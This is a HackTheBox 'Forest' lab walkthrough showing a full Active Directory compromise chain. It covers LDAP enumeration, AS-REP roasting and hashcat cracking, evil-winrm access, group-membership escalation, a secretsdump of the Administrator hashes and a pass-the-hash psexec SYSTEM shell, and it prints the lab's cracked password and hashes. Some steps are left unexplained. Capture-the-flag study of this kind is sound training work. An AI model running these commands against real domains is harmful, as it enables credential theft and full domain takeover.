# Forest (HackTheBox) — AS-REP Roasting & Privilege Escalation via Group Membership

A practical walkthrough of HTB's Forest box, focusing on AS-REP roasting exploitation, Active Directory enumeration, service account escalation, and privilege escalation through group membership manipulation.

---

## Reconnaissance

### Network Scanning

**Command:**
```bash
jbrown@Jabaris-MacBook-Pro forest % sudo nmap -sV -sC -O -T4 10.129.44.121
```

**Output:**
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 09:10 -0500
Nmap scan report for 10.129.44.121
Host is up (0.037s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-03-04 14:17:39Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-03-04T06:17:46-08:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-04T14:17:49
|_  start_date: 2026-03-04T13:59:42
|_clock-skew: mean: 2h46m49s, deviation: 4h37m07s, median: 6m49s

Nmap done: 1 IP address (1 host up) scanned in 25.80 seconds
```

**Key Findings:**
- Domain: `htb.local`
- DC: `FOREST`
- FQDN: `FOREST.htb.local`
- SMB signing: Required
- Services: DNS (53), Kerberos (88), LDAP (389), RPC (135), WinRM (5985)
- OS: Windows Server 2016 or 2019

---

## Initial Access: Anonymous LDAP Enumeration

### User Enumeration via windapsearch

**Command:**
```bash
jbrown@Jabaris-MacBook-Pro windapsearch % ./windapsearch.py -d htb.local --dc-ip 10.129.44.121
```

**Output:**
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.44.121
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=htb,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[*] Bye!
```

**Result:** Anonymous bind successful, found domain context `DC=htb,DC=local`.

### Group Enumeration

**Command:**
```bash
jbrown@Jabaris-MacBook-Pro windapsearch % ./windapsearch.py -d htb.local --dc-ip 10.129.44.121 -G
```

**Output:**
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.44.121
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=htb,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD groups
[+]	Found 59 groups: 

cn: Users
distinguishedName: CN=Users,CN=Builtin,DC=htb,DC=local

cn: Guests
distinguishedName: CN=Guests,CN=Builtin,DC=htb,DC=local

cn: Remote Desktop Users
distinguishedName: CN=Remote Desktop Users,CN=Builtin,DC=htb,DC=local

cn: Network Configuration Operators
distinguishedName: CN=Network Configuration Operators,CN=Builtin,DC=htb,DC=local

cn: Performance Monitor Users
distinguishedName: CN=Performance Monitor Users,CN=Builtin,DC=htb,DC=local

cn: Performance Log Users
distinguishedName: CN=Performance Log Users,CN=Builtin,DC=htb,DC=local

cn: Distributed COM Users
distinguishedName: CN=Distributed COM Users,CN=Builtin,DC=htb,DC=local

cn: IIS_IUSRS
distinguishedName: CN=IIS_IUSRS,CN=Builtin,DC=htb,DC=local

cn: Cryptographic Operators
distinguishedName: CN=Cryptographic Operators,CN=Builtin,DC=htb,DC=local

cn: Event Log Readers
distinguishedName: CN=Event Log Readers,CN=Builtin,DC=htb,DC=local

cn: Certificate Service DCOM Access
distinguishedName: CN=Certificate Service DCOM Access,CN=Builtin,DC=htb,DC=local

cn: RDS Remote Access Servers
distinguishedName: CN=RDS Remote Access Servers,CN=Builtin,DC=htb,DC=local

cn: RDS Endpoint Servers
distinguishedName: CN=RDS Endpoint Servers,CN=Builtin,DC=htb,DC=local

cn: RDS Management Servers
distinguishedName: CN=RDS Management Servers,CN=Builtin,DC=htb,DC=local

cn: Hyper-V Administrators
distinguishedName: CN=Hyper-V Administrators,CN=Builtin,DC=htb,DC=local

cn: Access Control Assistance Operators
distinguishedName: CN=Access Control Assistance Operators,CN=Builtin,DC=htb,DC=local

cn: Remote Management Users
distinguishedName: CN=Remote Management Users,CN=Builtin,DC=htb,DC=local

cn: System Managed Accounts Group
distinguishedName: CN=System Managed Accounts Group,CN=Builtin,DC=htb,DC=local

cn: Storage Replica Administrators
distinguishedName: CN=Storage Replica Administrators,CN=Builtin,DC=htb,DC=local

cn: Domain Computers
distinguishedName: CN=Domain Computers,CN=Users,DC=htb,DC=local

cn: Cert Publishers
distinguishedName: CN=Cert Publishers,CN=Users,DC=htb,DC=local

cn: Domain Users
distinguishedName: CN=Domain Users,CN=Users,DC=htb,DC=local

cn: Domain Guests
distinguishedName: CN=Domain Guests,CN=Users,DC=htb,DC=local

cn: Group Policy Creator Owners
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=htb,DC=local

cn: RAS and IAS Servers
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=htb,DC=local

cn: Pre-Windows 2000 Compatible Access
distinguishedName: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=htb,DC=local

cn: Incoming Forest Trust Builders
distinguishedName: CN=Incoming Forest Trust Builders,CN=Builtin,DC=htb,DC=local

cn: Windows Authorization Access Group
distinguishedName: CN=Windows Authorization Access Group,CN=Builtin,DC=htb,DC=local

cn: Terminal Server License Servers
distinguishedName: CN=Terminal Server License Servers,CN=Builtin,DC=htb,DC=local

cn: Allowed RODC Password Replication Group
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,DC=local

cn: Denied RODC Password Replication Group
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local

cn: Enterprise Read-only Domain Controllers
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local

cn: Cloneable Domain Controllers
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local

cn: Protected Users
distinguishedName: CN=Protected Users,CN=Users,DC=htb,DC=local

cn: Key Admins
distinguishedName: CN=Key Admins,CN=Users,DC=htb,DC=local

cn: Enterprise Key Admins
distinguishedName: CN=Enterprise Key Admins,CN=Users,DC=htb,DC=local

cn: DnsAdmins
distinguishedName: CN=DnsAdmins,CN=Users,DC=htb,DC=local

cn: DnsUpdateProxy
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local

cn: Organization Management
distinguishedName: CN=Organization Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Recipient Management
distinguishedName: CN=Recipient Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: View-Only Organization Management
distinguishedName: CN=View-Only Organization Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Public Folder Management
distinguishedName: CN=Public Folder Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: UM Management
distinguishedName: CN=UM Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Help Desk
distinguishedName: CN=Help Desk,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Records Management
distinguishedName: CN=Records Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Discovery Management
distinguishedName: CN=Discovery Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Server Management
distinguishedName: CN=Server Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Delegated Setup
distinguishedName: CN=Delegated Setup,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Hygiene Management
distinguishedName: CN=Hygiene Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Compliance Management
distinguishedName: CN=Compliance Management,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Security Reader
distinguishedName: CN=Security Reader,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Security Administrator
distinguishedName: CN=Security Administrator,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Exchange Servers
distinguishedName: CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Exchange Trusted Subsystem
distinguishedName: CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Managed Availability Servers
distinguishedName: CN=Managed Availability Servers,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: Exchange Windows Permissions
distinguishedName: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local

cn: ExchangeLegacyInterop
distinguishedName: CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
```

**Notable Groups:** 
- Multiple Exchange-related security groups
- DnsAdmins, DnsUpdateProxy
- Domain Computers, Domain Users, Domain Guests

---

## Credential Extraction: AS-REP Roasting

### Service Account Enumeration

**Command:**
```bash
jbrown@Jabaris-MacBook-Pro windapsearch % ./windapsearch.py -d htb.local --dc-ip 10.129.1.13 -u svc-alfresco -p s3rvice -l "Service Accounts" --full
```

**Output:**
```
[+] Using Domain Controller at: 10.129.1.13
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=htb,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 u:HTB\svc-alfresco
[+] Searching for matching DNs for term: "Service Accounts"
[+] Found 2 results:

0: OU=Service Accounts,DC=htb,DC=local
1: CN=Service Accounts,OU=Security Groups,DC=htb,DC=local

Which DN do you want to use? : 1
objectClass: top
objectClass: group
cn: Service Accounts
member: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
distinguishedName: CN=Service Accounts,OU=Security Groups,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920010308.0Z
whenChanged: 20190923194321.0Z
uSNCreated: 26096
memberOf: CN=Privileged IT Accounts,OU=Security Groups,DC=htb,DC=local
uSNChanged: 65575
name: Service Accounts
objectGUID: 1Xwoi5KGTEi75wOrN2TQYA==
objectSid: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPfAQAAA==
adminCount: 1
sAMAccountName: Service Accounts
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20260306124442.0Z
dSCorePropagationData: 20260306124442.0Z
dSCorePropagationData: 20260306124442.0Z
dSCorePropagationData: 20260306124442.0Z
dSCorePropagationData: 16010101000000.0Z
```

**Key Finding:** `svc-alfresco` is a member of the Service Accounts group.

### AS-REP Roasting Hash

**Hash for svc-alfresco (pre-auth disabled):**
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:33270a0ccbfccb67a03fb37a5dc256f8$7d10ab1f7c648e710b079fd6b2767c65c35b324b5c78965b510b1e1e7e4b652d701a2d4ceb2b5d0d1a2f18d620f4057c2526f49f5e7a291cb15af412e5ee55e8cfbabec918022b5f4896f8db5cc6c01e9c732d2b3210557649ef0c963035cf21e2593c02ace6e8b725f89f12f1cc57515e4d7db9af8f9bb1c3de72501e218251bcc86146cd669b91e6458303b1f6e089dda01dba8a12bca26486b800ae440bd7b0197031c677f6a86894cb8fda2a7f5d9d698efb3e6c2f5d7245d9428ddbd48c635561e95f50074ee67ce6daa5fedc4243f0c9fd801ccfda389ad7b50ad15b53da9220d86986:s3rvice
```

### Hash Cracking with Hashcat

**Command:**
```bash
jbrown@Jabaris-MacBook-Pro hashcat % ./hashcat -m 18200 ../../forest/hash.txt ../../wordlist/rockyou.txt
```

**Output:**
```
hashcat (v7.1.2-382-g2d71af371) starting

METAL API (Metal 368.52)
========================
* Device #01: Apple M2, skipped

OpenCL API (OpenCL 1.2 (Jul 20 2025 19:29:12)) - Platform #1 [Apple]
====================================================================
* Device #02: Apple M2, GPU, 2730/5461 MB (512 MB allocatable), 10MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 100c

Host memory allocated for this attack: 599 MB (1100 MB free)

Dictionary cache hit:
* Filename..: ../../wordlist/rockyou.txt
* Passwords.: [REDACTED:password]
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5asrep$23$svc-alfresco@HTB.LOCAL:33270a0ccbfccb67a03fb37a5dc256f8$7d10ab1f7c648e710b079fd6b2767c65c35b324b5c78965b510b1e1e7e4b652d701a2d4ceb2b5d0d1a2f18d620f4057c2526f49f5e7a291cb15af412e5ee55e8cfbabec918022b5f4896f8db5cc6c01e9c732d2b3210557649ef0c963035cf21e2593c02ace6e8b725f89f12f1cc57515e4d7db9af8f9bb1c3de72501e218251bcc86146cd669b91e6458303b1f6e089dda01dba8a12bca26486b800ae440bd7b0197031c677f6a86894cb8fda2a7f5d9d698efb3e6c2f5d7245d9428ddbd48c635561e95f50074ee67ce6daa5fedc4243f0c9fd801ccfda389ad7b50ad15b53da9220d86986:s3rvice

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:33270a0ccbfccb...d86986
Time.Started.....: Fri Mar  6 07:27:56 2026 (1 sec)
Time.Estimated...: Fri Mar  6 07:27:57 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (../../wordlist/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#02........:  9103.7 kH/s (0.57ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4259840/14344384 (29.70%)
Rejected.........: 0/4259840 (0.00%)
Restore.Point....: 3932160/14344384 (27.41%)
Restore.Sub.#02..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#02...: seaford12 -> rideordie06
Hardware.Mon.SMC.: Fan0: 0%
Hardware.Mon.#02.: Util: 86% Pwr:641mW

Started: Fri Mar  6 07:27:55 2026
Stopped: Fri Mar  6 07:27:57 2026
```

**Result:**
- Password cracked: `s3rvice`
- Speed: 9103.7 kH/s
- Time: ~1 second to crack

---

## Initial Shell Access

### WinRM Connection

**Command:**
```bash
jbrown@Jabaris-MacBook-Pro evil-winrm % ./evil-winrm.rb -i 10.129.1.13  -u svc-alfresco -p s3rvice
```

**Output:**
```
/opt/homebrew/lib/ruby/gems/4.0.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/opt/homebrew/lib/ruby/gems/4.0.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
/opt/homebrew/Cellar/ruby/4.0.1/lib/ruby/gems/4.0.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

**Result:** PowerShell remote session established.

### User Flag Retrieval

**Commands:**
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ../
*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls

    Directory: C:\Users\svc-alfresco\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         3/6/2026   4:04 AM             34 user.txt

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
4cd46ea332a5cab8f1b9f9a6757d14b9
```

**Flag:** `4cd46ea332a5cab8f1b9f9a6757d14b9`

---

## Privilege Escalation: Group Membership Manipulation

### Manual ACL Enumeration

**PowerShell script to enumerate group permissions:**
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\sharphound-v2.9.0> $searcher = [ADSISearcher]"(objectCategory=group)"
$searcher.PageSize = 1000
$searcher.FindAll() | ForEach-Object {
    $dn = $_.Properties.distinguishedname
    Write-Host "`n--- Permissions for: $dn ---" -ForegroundColor Cyan
    # Run dsacls and filter for high-privilege rights
    dsacls "$dn" | Select-String "GW|WD|GA"
}
```

### BloodHound & PowerView Enumeration

**PowerView commands attempted:**
```powershell
PowerView
OK got Powerview to work
Find-InterestingDomainAcl -ResolveGUIDs 
Get-DomainGroup | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteDacl" }
```

### netexec (nxc) BloodHound Collection

**Command:**
```bash
nxc ldap 10.129.1.13 -u svc-alfresco -p s3rvice -d htb.local --bloodhound --collection All --dns-server 10.129.1.13
```

**Note:** BloodHound kept failing initially. Need to update `/etc/hosts` as well.

### Cypher Query Reference

**List all groups:**
```cypher
MATCH (g:Group) RETURN g.name
MATCH (g:Group {domain: 'INTERNAL.CORP'}) RETURN g.name
```

**Find members of a specific group (e.g., Domain Admins):**
```cypher
MATCH (u)-[:MemberOf*1..]->(g:Group {name: 'DOMAIN ADMINS@domain.com'}) RETURN u.name, u.type
```

**Find all groups a user is a member of:**
```cypher
MATCH (u:User {name: 'USERNAME@domain.com'})-[:MemberOf*1..]->(g:Group) RETURN g.name
```

**Find nested group memberships (Groups inside groups):**
```cypher
MATCH (g1:Group)-[:MemberOf*1..]->(g2:Group) RETURN g1.name, g2.name
```

**List groups with the most members:**
```cypher
MATCH (g:Group)<-[:MemberOf*1..]-(u:User) RETURN g.name, count(u) AS MemberCount ORDER BY MemberCount DESC
```

### Exchange Windows Permissions Escalation

**Add service account to Exchange Windows Permissions group:**
```powershell
net localgroup "Group Name" "UserName" /add
net group "Exchange Windows Permissions" "svc-alfresco" /add /domain
```

**Output:**
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" "svc-alfresco" /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

**Why this works:**
- Exchange Windows Permissions group has WriteDacl rights on the domain root
- Allows modification of Access Control Lists (ACLs) on AD objects
- Can escalate to Domain Admin through ACL manipulation

---

## Post-Exploitation: Credential Dumping

### Domain Admin Credential Extraction

**Command:**
```bash
jbrown@Jabaris-MacBook-Pro examples % secretsdump.py htb/tester:password@10.129.1.13 -just-dc-user Administrator

Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
[*] Cleaning up... 
```

**Admin Hash:**
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

**Kerberos Keys:**
```
aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
des-cbc-md5:c1e049c71f57343b
```

### Administrative Access via PSExec

**Command:**
```bash
jbrown@Jabaris-MacBook-Pro examples % python3 psexec.py Administrator@10.129.1.13 cmd.exe -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

**Output:**
```
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.1.13.....
[*] Found writable share ADMIN$
[*] Uploading file HlaQrAGw.exe
[*] Opening SVCManager on 10.129.1.13.....
[*] Creating service SCvD on 10.129.1.13.....
[*] Starting service SCvD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

**Result:** SYSTEM shell established on domain controller.

---

## Key Takeaways

1. **AS-REP Roasting** — Service accounts with pre-auth disabled are easy targets; cracking yields immediate initial access
2. **Group Membership Escalation** — Exchange Windows Permissions provides ACL modification rights enabling privilege escalation
3. **LDAP Enumeration** — Anonymous bind reveals domain structure and service account details
4. **Manual ACL Enumeration** — PowerShell ADSI queries help identify high-privilege groups and delegation paths
5. **BloodHound Analysis** — Group membership chains and ACL relationships reveal escalation paths not visible through simple enumeration
6. **Credential Dumping** — Post-privilege escalation credential extraction enables complete domain compromise
